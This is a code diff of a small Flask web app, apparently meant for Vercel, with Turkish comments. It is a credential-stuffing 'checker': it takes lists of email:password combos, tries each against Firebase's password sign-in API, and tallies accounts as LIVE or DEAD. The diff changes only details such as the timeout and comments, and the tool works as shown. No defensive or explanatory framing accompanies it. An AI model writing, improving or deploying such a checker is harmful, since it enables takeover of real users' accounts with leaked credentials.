@@ -2,20 +2,18 @@ import os
 import requests
 from flask import Flask, render_template, request, jsonify
 
-# Vercel için Flask nesnesinin adı mutlaka 'app' olmalı
+# Vercel için Flask nesnesi adı mutlaka 'app' olmalı
 app = Flask(__name__)
 
-# API Key'i Vercel Settings'ten çekiyoruz
+# API Key'i Vercel Ayarlarından çekiyoruz
 API_KEY = os.getenv("FIREBASE_API_KEY")
 
 def check_account(email, password):
     url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
     payload = {"email": email, "password": password, "returnSecureToken": True}
     try:
-        r = requests.post(url, json=payload, timeout=5)
-        if r.status_code == 200:
-            return "LIVE"
-        return "DEAD"
+        r = requests.post(url, json=payload, timeout=7)
+        return "LIVE" if r.status_code == 200 else "DEAD"
     except:
         return "ERROR"
 
@@ -23,7 +21,7 @@ def check_account(email, password):
 def index():
     return render_template('index.html')
 
-@app.route('/start_scan', military_time=True, methods=['POST'])
+@app.route('/start_scan', methods=['POST'])
 def start_scan():
     data = request.json
     combos = data.get('combos', '').splitlines()
@@ -31,7 +29,7 @@ def start_scan():
     results = []
     stats = {"live": 0, "dead": 0, "checked": 0}
 
-    # HATA ÇÖZÜMÜ: ThreadPool yerine normal döngü kullanıyoruz (Vercel kısıtlaması için)
+    # HATA ÇÖZÜMÜ: ThreadPool yerine normal döngü kullanıyoruz
     for line in combos:
         if ":" in line:
             email, password = line.split(":", 1)
@@ -47,6 +45,5 @@ def start_scan():
     
     return jsonify({"results": results, "stats": stats})
 
-# Bu kısım Vercel için kritik
 if __name__ == '__main__':
     app.run(debug=True)
